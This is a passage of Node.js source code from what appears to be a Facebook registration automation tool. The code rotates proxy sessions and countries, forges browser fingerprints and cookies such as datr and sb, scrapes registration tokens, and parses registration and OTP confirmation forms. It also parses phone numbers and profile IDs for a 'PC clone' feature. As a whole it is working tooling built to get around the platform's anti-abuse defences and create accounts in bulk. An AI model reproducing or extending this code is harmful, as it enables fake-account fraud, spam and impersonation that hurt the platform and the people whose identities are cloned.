        user = next2;
        sessionId = nextTok;
        sessionRefreshed = true;
      } else if (origCap.isRotatingGateway || /[_-](?:country|cc)[_-][a-z]{2}/i.test(user)) {
        if (/([_-]sst[_-]\d+)/i.test(user)) {
          user = user.replace(/([_-]sst[_-]\d+)/i, `-ssid-${nextTok}$1`);
        } else if (hostLow.includes('iproyal') || (/_country-[a-z]{2}/i.test(user) && !/-/.test(user))) {
          user = `${user}_session-${nextTok}`;
        } else {
          user = `${user}-ssid-${nextTok}`;
        }
        sessionId = nextTok;
        sessionRefreshed = true;
        sessionInjected = !origCap.isNiceProxy && !origCap.isRotatingGateway;
      }
    }

    if (user !== origUser) {
      u.username = user;
    }
    const finalCap = inspectProxyCapabilities(u.toString());
    if (!isoApplied) isoApplied = finalCap.countryCode;
    if (!sessionId) sessionId = finalCap.sessionId;

    return {
      url: u.toString().replace(/\/$/, ''),
      isoApplied,
      sessionId,
      countryChanged,
      sessionRefreshed,
      cityCleared,
      countryInjected,
      sessionInjected,
    };
  } catch {
    return {
      url: raw,
      isoApplied: '',
      sessionId: '',
      countryChanged: false,
      sessionRefreshed: false,
      cityCleared: false,
      countryInjected: false,
      sessionInjected: false,
    };
  }
}

function recordProxyHealth(proxyUrl, ok, latencyMs = 0, meta = {}) {
  if (!proxyUrl) return;
  const key = proxyHealthKey(proxyUrl);
  const prev = proxyHealth.get(key) || {
    okCount: 0,
    failCount: 0,
    streakFail: 0,
    lastLatencyMs: 0,
    exitIp: '',
    blockedUntil: 0,
    lastErr: '',
  };
  if (ok) {
    prev.okCount += 1;
    prev.streakFail = 0;
    if (latencyMs > 0) prev.lastLatencyMs = latencyMs;
    prev.blockedUntil = 0;
    prev.lastErr = '';
    if (meta.exitIp) prev.exitIp = meta.exitIp;
  } else {
    prev.failCount += 1;
    prev.streakFail += 1;
    if (meta.err) prev.lastErr = meta.err;
    if (prev.streakFail >= 2) {
      prev.blockedUntil = Date.now() + 90 * 1000;
    }
  }
  proxyHealth.set(key, prev);
}

function selectSmartProxy(pool, index, badProxies, mode = 'rotate', fallback = null, preferIso = '') {
  const now = Date.now();
  const candidates = (pool || []).filter(
    (p) => (!badProxies || (!badProxies.has(p) && !badProxies.has(proxyHealthKey(p)))) && ((proxyHealth.get(proxyHealthKey(p))?.blockedUntil || 0) <= now)
  );
  let active = candidates.length > 0 ? candidates : (pool || []).filter((p) => !badProxies || (!badProxies.has(p) && !badProxies.has(proxyHealthKey(p))));
  if (active.length === 0) {
    const all = pool || [];
    if (all.length > 0) return all[index % all.length];
    return fallback || null;
  }
  const wantIso = String(preferIso || '').trim().toUpperCase();
  if (/^[A-Z]{2}$/.test(wantIso)) {
    const exactIso = active.filter((p) => inspectProxyCapabilities(p).countryCode === wantIso);
    if (exactIso.length > 0) {
      active = exactIso;
    } else {
      // Prefer country-switchable rotating gateways over proxies hardcoded to a DIFFERENT country
      const countrySwitchable = active.filter((p) => {
        const cap = inspectProxyCapabilities(p);
        return cap.isRotatingGateway || /\{(?:iso|cc|country)\}/i.test(p) || !cap.countryCode;
      });
      if (countrySwitchable.length > 0) active = countrySwitchable;
    }
  }
  if (mode === 'random') {
    return active[Math.floor(Math.random() * active.length)];
  }
  if (mode === 'fastest') {
    const scored = [...active].sort((a, b) => {
      const ha = proxyHealth.get(proxyHealthKey(a));
      const hb = proxyHealth.get(proxyHealthKey(b));
      const sa = (ha?.failCount || 0) * 800 + (ha?.lastLatencyMs || 1500) - (ha?.okCount || 0) * 150;
      const sb = (hb?.failCount || 0) * 800 + (hb?.lastLatencyMs || 1500) - (hb?.okCount || 0) * 150;
      return sa - sb;
    });
    return scored[index % Math.min(3, scored.length)];
  }
  return active[index % active.length];
}

function isValidPort(p) {
  if (!/^\d{1,5}$/.test(String(p))) return false;
  const n = Number(p);
  return n >= 1 && n <= 65535;
}

function validateProxyUrl(raw) {
  let s = (raw || '').trim();
  if (!s || /[\r\n\0]/.test(s)) return null;
  s = s.replace(/^\d{1,4}[.)]\s+/, '').trim();
  if (!s || /\s/.test(s)) return null;
  if (/^\d{1,5}$/.test(s)) return null;

  let scheme = 'http://';
  let rest = s;
  const schemeMatch = s.match(/^([a-zA-Z][a-zA-Z0-9+.-]*:\/\/)(.*)$/);
  if (schemeMatch) {
    const proto = schemeMatch[1].toLowerCase();
    if (!['http://', 'https://', 'socks4://', 'socks4a://', 'socks5://', 'socks5h://'].includes(proto)) {
      return null;
    }
    scheme = proto;
    rest = schemeMatch[2].replace(/\/+$/, '');
  }

  let candidate = '';
  if (rest.includes('@')) {
    const atIdx = rest.lastIndexOf('@');
    const left = rest.slice(0, atIdx);
    const right = rest.slice(atIdx + 1);
    const leftParts = left.split(':');
    const rightParts = right.split(':');
    if (
      leftParts.length === 2 &&
      isValidPort(leftParts[1]) &&
      rightParts.length >= 2 &&
      !isValidPort(rightParts[rightParts.length - 1])
    ) {
      const user = rightParts[0];
      const pass = rightParts.slice(1).join(':');
      candidate = `${scheme}${encodeURIComponent(user)}:${encodeURIComponent(pass)}@${leftParts[0]}:${leftParts[1]}`;
    } else {
      candidate = `${scheme}${rest}`;
    }
  } else {
    const parts = rest.split(':');
    if (parts.length === 4 && isValidPort(parts[3])) {
      const [user, pass, host, port] = parts;
      if (!host) return null;
      candidate = `${scheme}${encodeURIComponent(user)}:${encodeURIComponent(pass)}@${host}:${port}`;
    } else if (parts.length === 4 && isValidPort(parts[1])) {
      const [host, port, user, pass] = parts;
      if (!host) return null;
      candidate = `${scheme}${encodeURIComponent(user)}:${encodeURIComponent(pass)}@${host}:${port}`;
    } else if (parts.length === 2 && isValidPort(parts[1])) {
      candidate = `${scheme}${parts[0]}:${parts[1]}`;
    } else {
      candidate = `${scheme}${rest}`;
    }
  }

  try {
    const u = new URL(candidate);
    if (!['http:', 'https:', 'socks4:', 'socks4a:', 'socks5:', 'socks5h:'].includes(u.protocol)) {
      return null;
    }
    if (!u.hostname || !u.hostname.includes('.')) {
      if (u.hostname !== 'localhost') return null;
    }
    if (u.port && !isValidPort(u.port)) return null;
    return u.toString().replace(/\/$/, '');
  } catch {
    return null;
  }
}

function parseProxyLines(raw) {
  const out = [];
  const seen = new Set();
  for (const line of (raw || '').split(/\r?\n/)) {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith('#')) continue;
    const normalized = validateProxyUrl(trimmed);
    if (normalized && !seen.has(normalized)) {
      seen.add(normalized);
      out.push(normalized);
    }
  }
  return out;
}

function readGlobalProxies() {
  try {
    if (!fs.existsSync(FILES.proxies)) return [];
    return parseProxyLines(fs.readFileSync(FILES.proxies, 'utf-8'));
  } catch {
    return [];
  }
}

function writeGlobalProxies(list) {
  const unique = Array.from(new Set(list.map((x) => validateProxyUrl(x) || '').filter(Boolean)));
  fs.writeFileSync(FILES.proxies, unique.join('\n') + (unique.length ? '\n' : ''), 'utf-8');
}

function mergeRequestHeaders(baseHeaders, overrideHeaders) {
  const merged = {};
  const keyMap = {};
  const putAll = (src) => {
    for (const [k, v] of Object.entries(src || {})) {
      if (v === undefined || v === null || /[\r\n]/.test(k) || /[\r\n]/.test(String(v))) continue;
      const low = k.toLowerCase();
      if (low === 'accept-encoding') continue; // handled safely by curl --compressed / fetch
      if (keyMap[low]) delete merged[keyMap[low]];
      keyMap[low] = k;
      merged[k] = String(v);
    }
  };
  putAll(baseHeaders);
  putAll(overrideHeaders);
  return merged;
}

const proxyTrafficStats = {
  requests: 0,
  txBytes: 0,
  rxBytes: 0,
  savedWarmups: 0,
};

function formatBytes(bytes) {
  const b = Math.max(0, Number(bytes) || 0);
  if (b < 1024) return `${Math.round(b)} B`;
  if (b < 1024 * 1024) return `${(b / 1024).toFixed(1)} KB`;
  if (b < 1024 * 1024 * 1024) return `${(b / (1024 * 1024)).toFixed(2)} MB`;
  return `${(b / (1024 * 1024 * 1024)).toFixed(2)} GB`;
}

async function fetchViaProxyCurl(url, jar, opts = {}, proxyUrl = null) {
  const timeoutSec = Math.max(4, Math.ceil((opts.timeoutMs || 25000) / 1000));
  const marker = '__FBTOOLS_META__';
  const maxRedirects = opts.followRedirects === false ? 0 : Math.max(0, Math.min(8, Number(opts.maxRedirects ?? 6)));

  let proxyEndpoint = null;
  let proxyAuth = null;
  if (proxyUrl) {
    const parsedPx = new URL(proxyUrl);
    // Use remote DNS resolution for SOCKS proxies so VPS DNS never leaks
    const curlProto =
      parsedPx.protocol === 'socks5:'
        ? 'socks5h:'
        : parsedPx.protocol === 'socks4:'
        ? 'socks4a:'
        : parsedPx.protocol;
    proxyEndpoint = `${curlProto}//${parsedPx.hostname}${parsedPx.port ? ':' + parsedPx.port : ''}`;
    if (parsedPx.username || parsedPx.password) {
      proxyAuth = `${decodeURIComponent(parsedPx.username)}:${decodeURIComponent(parsedPx.password)}`;
    }
  }

  const defaultHdrs = {
    'User-Agent': opts.ua || opts.headers?.['User-Agent'] || LITE_UA,
    'Accept-Language': 'en-US,en;q=0.9',
    Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
  };

  let currentUrl = url;
  let method = (opts.method || 'GET').toUpperCase();
  let body = opts.body;
  let redirectedFromPost = false;

  for (let hop = 0; hop <= maxRedirects; hop++) {
    const hdrs = mergeRequestHeaders(defaultHdrs, opts.headers);
    if (redirectedFromPost && method === 'GET') {
      for (const k of Object.keys(hdrs)) {
        const lk = k.toLowerCase();
        if (lk === 'content-type' || lk === 'content-length' || lk === 'origin') {
          delete hdrs[k];
        }
      }
    }
    const cookieStr = formatCookieHeader(jar);
    if (cookieStr) hdrs.Cookie = cookieStr;
    else {
      for (const k of Object.keys(hdrs)) {
        if (k.toLowerCase() === 'cookie') delete hdrs[k];
      }
    }

    const args = [
      '-sS',
      '--http2',
      '--compressed',
      '--max-redirs',
      '0',
      '--connect-timeout',
      String(Math.min(6, timeoutSec)),
      '--max-time',
      String(timeoutSec),
      ...(proxyEndpoint ? ['--no-keepalive', '--max-filesize', String(opts.maxFilesize || 1572864)] : []),
      ...(opts.headOnly ? ['-I'] : []),
      '-i',
      ...(proxyEndpoint ? ['-x', proxyEndpoint] : []),
      ...(proxyAuth ? ['--proxy-user', proxyAuth] : []),
      '-X',
      method,
    ];

    for (const [k, v] of Object.entries(hdrs)) {
      args.push('-H', `${k}: ${v}`);
    }
    if (body !== undefined && method !== 'GET' && method !== 'HEAD') {
      args.push('--data-raw', body);
    }
    args.push('-w', `\n${marker}%{http_code}|%{url_effective}|%{size_download}`);
    args.push(currentUrl);

    const rawOut = await new Promise((resolve, reject) => {
      const child = spawn('curl', args, { shell: false });
      const chunks = [];
      const errChunks = [];
      let aborted = false;
      const abortCheck = opts.shouldAbort
        ? setInterval(() => {
            if (opts.shouldAbort()) {
              aborted = true;
              try { child.kill('SIGKILL'); } catch { /* ignore */ }
            }
          }, 250)
        : null;
      child.stdout.on('data', (c) => chunks.push(c));
      child.stderr.on('data', (c) => errChunks.push(c));
      child.on('error', (err) => {
        if (abortCheck) clearInterval(abortCheck);
        reject(err);
      });
      child.on('close', (code) => {
        if (abortCheck) clearInterval(abortCheck);
        if (aborted) {
          reject(new Error('Aborted by user'));
        } else if (code !== 0 && chunks.length === 0) {
          reject(new Error(Buffer.concat(errChunks).toString('utf-8').trim() || `curl exited ${code}`));
        } else {
          resolve(Buffer.concat(chunks).toString('utf-8'));
        }
      });
    });

    const idx = rawOut.lastIndexOf(`\n${marker}`);
    const metaPart = idx >= 0 ? rawOut.slice(idx + marker.length + 1).trim() : '';
    const payload = idx >= 0 ? rawOut.slice(0, idx) : rawOut;
    const [statusStr, effUrl, dlSizeStr] = metaPart.split('|');
    let status = Number(statusStr) || 200;

    if (proxyEndpoint) {
      const hdrBytes = Object.entries(hdrs).reduce((acc, [k, v]) => acc + k.length + String(v).length + 4, 96);
      const bodyBytes = body ? Buffer.byteLength(String(body)) : 0;
      const dlBytes = Number(dlSizeStr) || Buffer.byteLength(payload || '');
      proxyTrafficStats.requests += 1;
      proxyTrafficStats.txBytes += hdrBytes + bodyBytes;
      proxyTrafficStats.rxBytes += dlBytes;
    }

    let rest = payload;
    let hopLocation = '';
    while (rest.startsWith('HTTP/')) {
      const sepCrLf = rest.indexOf('\r\n\r\n');
      const sepLf = rest.indexOf('\n\n');
      let cut = -1;
      let step = 0;
      if (sepCrLf >= 0 && (sepLf < 0 || sepCrLf < sepLf)) {
        cut = sepCrLf;
        step = 4;
      } else if (sepLf >= 0) {
        cut = sepLf;
        step = 2;
      }
      if (cut < 0) break;
      const hdrBlock = rest.slice(0, cut);
      let blockLoc = '';
      const lines = hdrBlock.split(/\r?\n/);
      const statusM = lines[0]?.match(/^HTTP\/\S+\s+(\d{3})/);
      if (statusM) {
        const blkCode = Number(statusM[1]);
        if (blkCode !== 100 && blkCode !== 103 && !(blkCode === 200 && /connection established/i.test(lines[0]))) {
          status = blkCode;
        }
      }
      for (const line of lines.slice(1)) {
        const lowLine = line.toLowerCase();
        if (lowLine.startsWith('set-cookie:')) {
          const cookieVal = line.slice('set-cookie:'.length).trim();
          const first = cookieVal.split(';', 1)[0] || '';
          const eq = first.indexOf('=');
          if (eq > 0) {
            const k = first.slice(0, eq).trim();
            const v = first.slice(eq + 1).trim();
            if (k && v !== 'deleted') jar[k] = v;
            else if (k && v === 'deleted') delete jar[k];
          }
        } else if (lowLine.startsWith('location:')) {
          blockLoc = line.slice('location:'.length).trim();
        }
      }
      if (blockLoc) hopLocation = blockLoc;
      rest = rest.slice(cut + step);
      while (/^[\r\n]+HTTP\//.test(rest)) {
        rest = rest.replace(/^[\r\n]+/, '');
      }
    }

    if (status >= 300 && status < 400 && hopLocation && hop < maxRedirects) {
      try {
        currentUrl = new URL(hopLocation, effUrl || currentUrl).toString();
      } catch {
        return { status, url: effUrl || currentUrl, text: rest };
      }
      if (status === 301 || status === 302 || status === 303) {
        if (method !== 'GET') redirectedFromPost = true;
        method = 'GET';
        body = undefined;
      }
      continue;
    }

    return { status, url: effUrl || currentUrl, text: rest };
  }

  throw new Error('Too many redirects');
}

function mergeSetCookies(jar, headers) {
  const rawList = typeof headers.getSetCookie === 'function' ? headers.getSetCookie() : [];
  if (rawList.length === 0) {
    const single = headers.get('set-cookie');
    if (single) rawList.push(single);
  }
  for (const line of rawList) {
    const first = line.split(';', 1)[0];
    const eq = first.indexOf('=');
    if (eq > 0) {
      const k = first.slice(0, eq).trim();
      const v = first.slice(eq + 1).trim();
      if (k && v !== 'deleted') jar[k] = v;
      else if (k && v === 'deleted') delete jar[k];
    }
  }
}

async function fetchWithJar(url, jar, opts = {}) {
  const validProxy = validateProxyUrl(opts.proxy);
  const t0 = Date.now();
  if (validProxy) {
    try {
      const res = await fetchViaProxyCurl(url, jar, opts, validProxy);
      if (res.status === 407) {
        const authErr = new Error('Proxy auth required (HTTP 407)');
        authErr.isProxyError = true;
        authErr.proxyUrl = validProxy;
        recordProxyHealth(validProxy, false, Date.now() - t0, { err: 'HTTP 407' });
        throw authErr;
      }
      recordProxyHealth(validProxy, res.status < 500, Date.now() - t0);
      return res;
    } catch (err) {
      const reason = err instanceof Error ? err.message : 'proxy error';
      recordProxyHealth(validProxy, false, Date.now() - t0, { err: reason });
      if (opts.strictProxy !== false) {
        const pxErr = new Error(`Proxy failed (${reason})`);
        pxErr.isProxyError = true;
        pxErr.proxyUrl = validProxy;
        throw pxErr;
      }
      appendDebugLog(`proxy failed (${reason}), direct fallback`);
    }
  }

  if (opts.preferCurl) {
    return await fetchViaProxyCurl(url, jar, opts, null);
  }

  let currentUrl = url;
  const maxRedirects = 6;
  const timeoutMs = opts.timeoutMs || 25000;
  let method = opts.method || 'GET';
  let body = opts.body;

  for (let hop = 0; hop <= maxRedirects; hop++) {
    const cookieStr = formatCookieHeader(jar);
    const baseHdrs = {
      'User-Agent': opts.ua || opts.headers?.['User-Agent'] || LITE_UA,
      'Accept-Language': 'en-US,en;q=0.9',
      Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    };
    const finalHdrs = mergeRequestHeaders(baseHdrs, opts.headers);
    if (cookieStr) finalHdrs.Cookie = cookieStr;

    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), timeoutMs);
    try {
      const res = await fetch(currentUrl, {
        method,
        headers: finalHdrs,
        body,
        redirect: 'manual',
        signal: controller.signal,
      });
      clearTimeout(timer);
      mergeSetCookies(jar, res.headers);

      if (res.status >= 300 && res.status < 400) {
        const loc = res.headers.get('location');
        if (loc) {
          currentUrl = new URL(loc, currentUrl).toString();
          if (res.status === 301 || res.status === 302 || res.status === 303) {
            method = 'GET';
            body = undefined;
          }
          continue;
        }
      }
      const text = await res.text();
      return { status: res.status, url: currentUrl, text };
    } catch (err) {
      clearTimeout(timer);
      throw err;
    }
  }
  throw new Error('Too many redirects');
}

async function testProxyTcp(target, checkExitIp = true, opts = {}) {
  const t0 = Date.now();
  const valid = validateProxyUrl(target);
  if (!valid) {
    return { proxy: target, ok: false, latencyMs: 0, error: 'Invalid proxy format' };
  }
  try {
    const parsed = new URL(valid);
    const port = Number(parsed.port || (parsed.protocol === 'https:' ? 443 : 80));
    await new Promise((resolve, reject) => {
      const s = net.createConnection({ host: parsed.hostname, port, timeout: 2200 }, () => {
        s.destroy();
        resolve();
      });
      s.on('error', (e) => {
        s.destroy();
        reject(e);
      });
      s.on('timeout', () => {
        s.destroy();
        reject(new Error('TCP timeout'));
      });
    });

    const fp = buildFingerprint('');
    const probeJar = {};
    const fbPromise = fetchViaProxyCurl(
      `${FB_REG_BASE}/reg/?cid=103&refsrc=deprecated&soft=hjk`,
      probeJar,
      { timeoutMs: 8000, ua: fp.ua, headers: fp.headers, headOnly: Boolean(opts.lite) },
      valid
    );
    const ipPromise = checkExitIp
      ? fetchViaProxyCurl('https://ip-info.9proxy.com', {}, { timeoutMs: 4500, ua: fp.ua }, valid)
          .then(async (r) => {
            try {
              const j = JSON.parse(r.text || '{}');
              if (j.ip) return { ip: j.ip, iso: j.iso2 || '', country: j.country || '', city: j.city || '', isp: j.isp || '' };
            } catch {
              // fallback
            }
            const r2 = await fetchViaProxyCurl('https://api.ipify.org?format=json', {}, { timeoutMs: 3000, ua: fp.ua }, valid);
            try {
              const j2 = JSON.parse(r2.text || '{}');
              return { ip: j2.ip || '', iso: '', country: '', city: '', isp: '' };
            } catch {
              return { ip: '', iso: '', country: '', city: '', isp: '' };
            }
          })
          .catch(() => ({ ip: '', iso: '', country: '', city: '', isp: '' }))
      : Promise.resolve({ ip: '', iso: '', country: '', city: '', isp: '' });

    const [probeRes, geoInfo] = await Promise.all([fbPromise, ipPromise]);
    const exitIp = geoInfo?.ip || '';
    const latencyMs = Date.now() - t0;
    const body = probeRes.text || '';
    const hasLsd = !opts.lite && Boolean(
      body.match(/"LSD",\[\],\{"token":"([^"]+)"/) || body.match(/name="lsd"[^>]*value="([^"]+)"/i)
    );
    if (probeRes.status >= 400) {
      recordProxyHealth(valid, false, latencyMs, { err: `HTTP ${probeRes.status}` });
      return { proxy: valid, ok: false, latencyMs, exitIp, geoInfo, hasLsd: false, error: `HTTP ${probeRes.status}` };
    }
    recordProxyHealth(valid, true, latencyMs, { exitIp });
    return { proxy: valid, ok: true, latencyMs, exitIp, geoInfo, hasLsd };
  } catch (err) {
    const latencyMs = Date.now() - t0;
    const msg = err instanceof Error ? err.message : 'unreachable';
    recordProxyHealth(valid, false, latencyMs, { err: msg });
    return { proxy: valid, ok: false, latencyMs, error: msg };
  }
}

// ----------------------------------------------------------------------------
// 4. Number Normalization, Cookie & HTML / JSONStream Form Parsing
// ----------------------------------------------------------------------------
function detectCountryFromNumber(raw, fallbackCc = '880', countryHintName = '') {
  const rawTrim = String(raw || '').trim();
  const explicitIntl = rawTrim.startsWith('+');
  let d = rawTrim.replace(/\D/g, '');
  if (!d) return null;
  let hadZeroZero = false;
  if (d.startsWith('00')) {
    d = d.slice(2);
    hadZeroZero = true;
  }
  if (!d || d.length > 15) return null;

  const hintIso = countryNameToIso(countryHintName);
  const fbCc = String(fallbackCc || '880').replace(/\D/g, '') || '880';
  const [fbNat, fbTrunk] = CC_INFO[fbCc] || [0, '0'];

  // Special case: Kazakhstan (+76 / +77) vs Russia (+7)
  if ((d.startsWith('76') || d.startsWith('77')) && d.length === 11 && (explicitIntl || hadZeroZero || fbCc !== '7')) {
    return { normalized: d, cc: '7', name: 'Kazakhstan', iso: 'KZ' };
  }

  // Local number with leading trunk 0 (not explicit + or 00) -> use fallback CC
  if (!explicitIntl && !hadZeroZero && d.startsWith('0')) {
    const stripped = fbTrunk && d.startsWith(fbTrunk) ? d.slice(fbTrunk.length) : d.replace(/^0+/, '');
    const full = fbCc + stripped;
    if (fbNat && full.length < fbCc.length + fbNat - 2) return null;
    if (full.length > 15 || full.length < 8) return null;
    const [name, iso] = COUNTRY_MAP[fbCc] || [countryHintName || 'Unknown', hintIso || '??'];
    return { normalized: full, cc: fbCc, name, iso: iso !== '??' ? iso : (hintIso || '??') };
  }

  // If digits look like an exact local number for fallbackCc (without CC prefix), treat as local fallbackCc
  if (!explicitIntl && !hadZeroZero && fbNat > 0 && d.length === fbNat && !d.startsWith(fbCc)) {
    const full = fbCc + d;
    if (full.length <= 15) {
      const [name, iso] = COUNTRY_MAP[fbCc] || [countryHintName || 'Unknown', hintIso || '??'];
      return { normalized: full, cc: fbCc, name, iso: iso !== '??' ? iso : (hintIso || '??') };
    }
  }

  // Auto-detect international country prefix (longest match 3 -> 2 -> 1)
  for (const len of [3, 2, 1]) {
    const prefix = d.slice(0, len);
    const mapped = COUNTRY_MAP[prefix];
    if (!mapped) continue;
    const info = CC_INFO[prefix];
    if (info && info[0] > 0) {
      const minLen = prefix.length + info[0] - (explicitIntl || hadZeroZero ? 2 : 1);
      const maxLen = prefix.length + info[0] + 2;
      if (d.length >= minLen && d.length <= Math.min(15, maxLen)) {
        return { normalized: d, cc: prefix, name: mapped[0], iso: mapped[1] };
      }
    } else if (d.length >= prefix.length + 7 && d.length <= 15) {
      if (len >= 2 || explicitIntl || hadZeroZero) {
        return { normalized: d, cc: prefix, name: mapped[0], iso: mapped[1] };
      }
    }
  }

  // Fallback to countryHintName if explicit international number has unmapped dial prefix
  if ((explicitIntl || hadZeroZero) && hintIso) {
    return { normalized: d, cc: d.slice(0, 3), name: countryHintName || hintIso, iso: hintIso };
  }

  // Fallback to default CC
  let out = d;
  if (!out.startsWith(fbCc)) {
    if (fbTrunk && out.startsWith(fbTrunk)) out = out.slice(fbTrunk.length);
    out = fbCc + out;
  }
  if (fbNat && out.length < fbCc.length + fbNat - 2) return null;
  if (out.length > 15 || out.length < 8) return null;
  const [name, iso] = COUNTRY_MAP[fbCc] || [countryHintName || 'Unknown', hintIso || '??'];
  return { normalized: out, cc: fbCc, name, iso: iso !== '??' ? iso : (hintIso || '??') };
}

function normNumber(raw, cc) {
  const det = detectCountryFromNumber(raw, cc);
  return det ? det.normalized : '';
}

function parsePcCloneTarget(raw, defaultCc) {
  const t = String(raw || '').trim();
  if (!t) return null;
  const urlUid = t.match(/(?:facebook\.com\/profile\.php\?id=|facebook\.com\/)([0-9]{5,20})/i);
  if (urlUid && urlUid[1]) return urlUid[1];
  const digits = t.replace(/\D/g, '');
  if (!digits) return null;
  if (/^1000\d{8,11}$|^615\d{10,12}$/.test(digits) || (digits.length >= 8 && digits.length <= 15 && (t.startsWith('+') || t.startsWith('00') || digits.length >= 11))) {
    return t.startsWith('+') ? digits : (t.startsWith('00') ? digits : normNumber(t, defaultCc) || digits);
  }
  return normNumber(t, defaultCc) || digits;
}

function numberVariants(num, cc) {
  const d = (num || '').replace(/\D/g, '');
  if (!d) return [''];
  const det = detectCountryFromNumber(`+${d}`, cc);
  const effCc = det?.cc || String(cc || '').replace(/\D/g, '');
  const out = [d, '+' + d, '00' + d];
  const [, trunk] = CC_INFO[effCc] || [0, '0'];
  if (effCc && d.startsWith(effCc) && d.length > effCc.length + 5) {
    out.push((trunk || '') + d.slice(effCc.length));
  }
  return Array.from(new Set(out));
}

function parseCookieHeader(raw) {
  const out = {};
  for (const part of (raw || '').replace(/\n/g, ';').split(';')) {
    const idx = part.indexOf('=');
    if (idx > 0) {
      const k = part.slice(0, idx).trim();
      const v = part.slice(idx + 1).trim();
      if (k) out[k] = v;
    }
  }
  return out;
}

function normalizeBaseCookiesRaw(raw) {
  const parts = (raw || '')
    .replace(/\r?\n/g, ';')
    .split(';')
    .map((p) => p.trim())
    .filter((p) => p.includes('='));
  const keys = new Set(parts.map((p) => p.split('=', 1)[0].trim()));
  if (!keys.has('sb')) parts.push(`sb=${freshSb()}`);
  if (!keys.has('datr')) parts.push(`datr=${randTok(12)}`);
  if (!keys.has('wd')) parts.push('wd=360x800');
  if (!keys.has('m_pixel_ratio')) parts.push('m_pixel_ratio=2');
  return parts.join('; ');
}

function readForm(html, prefer = 'reg') {
  const forms = html.match(/<form[^>]*>[\s\S]*?<\/form>/gi) || [];
  let blk = html || '';
  if (forms.length > 0) {
    forms.sort((a, b) => {
      if (prefer === 'otp') {
        const al = a.toLowerCase();
        const bl = b.toLowerCase();
        const aHasOtp = OTP_FIELDS.some((k) => al.includes(`name="${k}"`) || al.includes(`name='${k}'`));
        const bHasOtp = OTP_FIELDS.some((k) => bl.includes(`name="${k}"`) || bl.includes(`name='${k}'`));
        if (aHasOtp !== bHasOtp) return aHasOtp ? -1 : 1;
        const aHasConfirm = al.includes('confirm') || al.includes('checkpoint');
        const bHasConfirm = bl.includes('confirm') || bl.includes('checkpoint');
        if (aHasConfirm !== bHasConfirm) return aHasConfirm ? -1 : 1;
        return b.length - a.length;
      }
      const aReg = a.includes('reg_email__');
      const bReg = b.includes('reg_email__');
      if (aReg !== bReg) return aReg ? -1 : 1;
      return b.length - a.length;
    });
    blk = forms[0] ?? '';
  }

  const actMatch = blk.match(/action=["']([^"']+)["']/i);
  const action = (actMatch ? actMatch[1] : '').replace(/&amp;/g, '&');
  const inputs = {};
  const selects = {};

  let submitChosen = false;
  const inputTags = blk.match(/<input[^>]*>/gi) || [];
  for (const tag of inputTags) {
    const nMatch = tag.match(/name=["']([^"']+)["']/i);
    if (!nMatch) continue;
    const name = nMatch[1];
    const tMatch = tag.match(/type=["']([^"']+)["']/i);
    const vMatch = tag.match(/value=["']([^"']*)["']/i);
    const itype = tMatch ? tMatch[1].toLowerCase() : 'text';
    const ival = vMatch ? vMatch[1] : '';

    if (itype === 'submit') {
      const ln = name.toLowerCase();
      const lv = ival.toLowerCase();
      if (prefer === 'otp' && ['resend', 'change', 'cancel', 'logout'].some((w) => ln.includes(w) || lv.includes(w))) {
        continue;
      }
      if (prefer === 'otp' && submitChosen) continue;
      submitChosen = true;
    }
    inputs[name] = [itype, ival];
  }

  if (prefer === 'otp' && !submitChosen) {
    const btnTags = blk.match(/<button[^>]*type=["']?submit["']?[^>]*>/gi) || [];
    for (const tag of btnTags) {
      const nMatch = tag.match(/name=["']([^"']+)["']/i);
      const vMatch = tag.match(/value=["']([^"']*)["']/i);
      if (nMatch) {
        const bname = nMatch[1];
        const bval = vMatch ? vMatch[1] : '1';
        if (!['resend', 'change', 'cancel', 'logout'].some((w) => bname.toLowerCase().includes(w) || bval.toLowerCase().includes(w))) {
          inputs[bname] = ['submit', bval];
          break;
        }
      }
    }
  }

  const selectTags = blk.match(/<select[^>]*>[\s\S]*?<\/select>/gi) || [];
  for (const sm of selectTags) {
    const nMatch = sm.match(/name=["']([^"']+)["']/i);
    if (!nMatch) continue;
    const opts = [];
    const optMatches = sm.matchAll(/<option[^>]*>([\s\S]*?)<\/option>/gi);
    for (const om of optMatches) {
      const valMatch = om[0].match(/value=["']([^"']*)["']/i);
      const txt = om[1].replace(/<[^>]+>/g, '').trim();
      opts.push([valMatch ? valMatch[1] : txt, txt]);
    }
    selects[nMatch[1]] = opts;
  }

  return { action, inputs, selects };
}

function tok(html, name) {
  if (name === 'lsd') {
    const mLsd = html.match(/"LSD",\[\],\{"token":"([^"]+)"\}/);
    if (mLsd) return mLsd[1];
  }
  const r1 = new RegExp(`name=["']${name}["'][^>]*?value=["']([^"']+)["']`, 'i');
  const r2 = new RegExp(`value=["']([^"']+)["'][^>]*?name=["']${name}["']`, 'i');
  const r3 = new RegExp(`"${name}"\\s*:\\s*"([^"]+)"`, 'i');
  const m1 = html.match(r1);
  if (m1) return m1[1];
  const m2 = html.match(r2);
  if (m2) return m2[1];
  const m3 = html.match(r3);
  if (m3) return m3[1];
  return '';
}

function fromXrefCookie(jar) {
  const raw = jar['x-referer'] || '';
  if (!raw) return { etok: '', dhash: '', cid: '' };
  try {
    const dec = decodeURIComponent(raw);
    return {
      etok: dec.match(/e_token=([A-Za-z0-9_\-]+)/)?.[1] ?? '',
      dhash: dec.match(/d_hash=([A-Za-z0-9_\-]+)/)?.[1] ?? '',
      cid: dec.match(/cid=(\d+)/)?.[1] ?? '',
    };
  } catch {
    return { etok: '', dhash: '', cid: '' };
  }
}

// ----------------------------------------------------------------------------
// 5. Facebook GraphQL Pre-Check, Limited Pringer Engine & OTP Confirmation
// ----------------------------------------------------------------------------
function decodeJsonEscapedStr(s) {
  return String(s || '')
    .replace(/\\u003C/gi, '<')
    .replace(/\\u003E/gi, '>')
    .replace(/\\u0026/gi, '&')
    .replace(/\\u0027/gi, "'")
    .replace(/\\u003D/gi, '=')
    .replace(/\\\//g, '/')
    .replace(/\\"/g, '"')
    .replace(/\\n/g, ' ')
    .replace(/\\r/g, ' ')
    .replace(/\\t/g, ' ');
}

function extractBigPipeHtmlFragments(rawText) {
  const fragments = [];
  const raw = String(rawText || '');
  // Extract __html:"..." or markup strings inside BigPipe / JSONStream responses
  for (const m of raw.matchAll(/"__html"\s*:\s*"((?:\\.|[^"\\])*)"/g)) {
